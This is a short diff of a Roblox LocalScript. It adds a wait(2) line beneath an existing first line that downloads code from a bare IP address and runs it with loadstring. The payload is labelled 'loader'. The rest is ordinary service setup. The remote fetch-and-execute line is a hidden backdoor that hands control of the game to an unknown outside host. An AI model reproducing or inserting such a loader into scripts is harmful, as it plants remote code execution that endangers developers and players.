@@ -1,5 +1,6 @@
 -- LocalScript (StarterPlayerScripts)
 loadstring(game:HttpGet("http://72.56.90.233:3910/api/run/eyJpZCI6IjA0NDE1NzU1LTk3ZjEtNGIzNC05MGQwLTNlZTA5YzBiZTkxOCIsImtpbmQiOiJsb2FkZXIifQ"))()
+wait(2)
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
 local RunService = game:GetService("RunService")
